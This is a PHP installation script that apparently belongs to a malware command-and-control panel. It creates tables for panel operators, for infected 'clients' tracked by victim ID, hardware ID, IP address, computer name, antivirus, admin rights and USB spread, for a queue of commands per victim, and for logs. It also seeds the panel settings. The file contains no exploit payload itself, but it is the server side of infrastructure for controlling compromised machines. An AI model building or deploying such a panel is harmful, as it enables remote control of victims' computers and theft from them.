<?php

$utils = new Utils;

$install = new Update;

$required_libs = [
    "JSON" => "json",
    "PDO" => "pdo",
    "MySQL" => "pdo_mysql",
    "Mbstring" => "mbstring",
    "Phar" => "phar",
];

$is_installed = [];

$writable_folders = ["scripts", "plugins", "upload", "error_logs"];

$is_writable = [];

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $users = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["username", 'text', 'NOT NULL'],
        ["password", 'text', 'NOT NULL'],
        ["email", 'text', 'NOT NULL'],
        ["role", 'varchar(50)', 'NOT NULL'],
        ["s2fa", 'varchar(10)', 'NOT NULL'],
        ["secret", 'varchar(50)', 'NOT NULL'],
        ["sqenable", 'varchar(50)', 'NOT NULL'],
        ["question", 'varchar(5)', 'NOT NULL'],
        ["answer", 'text', 'NOT NULL'],
        ['last_login', 'timestamp', 'NOT NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
        ["failed_login", "int(11)", "NOT NULL"],
    ];

    $clients = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["vicid", 'text', 'NULL'],
        ["hwid", 'text', 'NULL'],
        ["ipaddress", 'text', 'NULL'],
        ["computername", 'text', 'NULL'],
        ["country", 'text', 'NULL'],
        ["os", 'text', 'NULL'],
        ["insdate", 'text', 'NULL'],
        ["update_at", 'text', 'NULL'],
        ["pings", 'int(11)', 'NULL'],
        ['antivirus', 'text', 'NULL'],
        ['version', 'text', 'NULL'],
        ['status', 'varchar(10)', 'NULL'],
        ['is_usb', 'varchar(5)', 'NULL'],
        ["is_admin", 'varchar(5)', "NULL"],
    ];

    $commands = [
        ["id", 'int(11)', 'unsigned', 'NULL'],
        ["vicid", 'text', 'NULL'],
        ["command", 'text', 'NULL'],
    ];

    $confirm_code = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["username", 'text', 'NOT NULL'],
        ["token", 'text', 'NOT NULL'],
        ["created_at", 'timestamp', 'NOT NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
    ];

    $logs = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["time", 'timestamp', 'NOT NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
        ["vicid", 'text', 'NOT NULL'],
        ["type", 'varchar(10)', 'NOT NULL'],
        ["message", 'text', 'NOT NULL'],
    ];

    $settings = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["setting_key", 'varchar(50)', 'NOT NULL'],
        ["setting_value", 'varchar(50)', 'NOT NULL'],
    ];

    $sql = [
        $install->create_table("users", $users),
        $install->create_table("clients", $clients),
        $install->create_table("commands", $commands),
        $install->create_table("confirm_code", $confirm_code),
        $install->create_table("logs", $logs),
        $install->create_table("settings", $settings),
        $install->insert_value("users", [
            "id" => 1,
            "username" => $utils->sanitize($_POST['username']),
            "password" => password_hash($utils->sanitize($_POST['password']), PASSWORD_BCRYPT),
            "email" => $utils->sanitize($_POST['email']),
            "role" => 'administrator',
            "s2fa" => 'off',
            "secret" => 'null',
            "sqenable" => 'off',
            "question" => 'null',
            "answer" => '',
            "last_login" => date('Y-m-d H:i:s'),
            "failed_login" => 0,
        ]),
        $install->insert_value("settings", [
            "id" => 1,
            "setting_key" => 'panel_status',
            "setting_value" => 'on',
        ]),
        $install->insert_value("settings", [
            "id" => 2,
            "setting_key" => 'recaptcha_status',
            "setting_value" => 'off',
        ]),
        $install->insert_value("settings", [
            "id" => 3,
            "setting_key" => 'recaptchapublic',
            "setting_value" => 'UpdateYourCode',
        ]),
        $install->insert_value("settings", [
            "id" => 4,
            "setting_key" => 'recaptchaprivate',
            "setting_value" => 'UpdateYourCode',
        ]),
        $install->insert_value("settings", [
            "id" => 5,
            "setting_key" => 'smtp_status',
            "setting_value" => 'off',
        ]),
        $install->insert_value("settings", [
            "id" => 6,
            "setting_key" => 'smtp_host',
            "setting_value" => 'smtp.localhost.com',
        ]),
        $install->insert_value("settings", [
            "id" => 7,
            "setting_key" => 'smtp_username',
            "setting_value" => 'localhost@gmail.com',
        ]),
        $install->insert_value("settings", [
            "id" => 8,
            "setting_key" => 'smtp_password',
            "setting_value" => base64_encode('password'),
        ]),
        $install->insert_value("settings", [
            "id" => 9,
            "setting_key" => 'smtp_security',
            "setting_value" => 'ssl',
        ]),
        $install->insert_value("settings", [
            "id" => 10,
            "setting_key" => 'smtp_port',
            "setting_value" => '461',
        ]),
        $install->is_primary("users", "id"),
        $install->is_autoinc("users", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("clients", "id"),
        $install->is_autoinc("clients", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("commands", "id"),
        $install->is_autoinc("commands", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("confirm_code", "id"),
        $install->is_autoinc("confirm_code", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("logs", "id"),
        $install->is_autoinc("logs", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("settings", "id"),
        $install->is_autoinc("settings", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
    ];

    foreach ($sql as $query) {
        try {
            $msg = $install->execute($query);
        } catch (Exception $e) {
            echo $e->getMessage();
        }
    }
}

$page = "installPage";
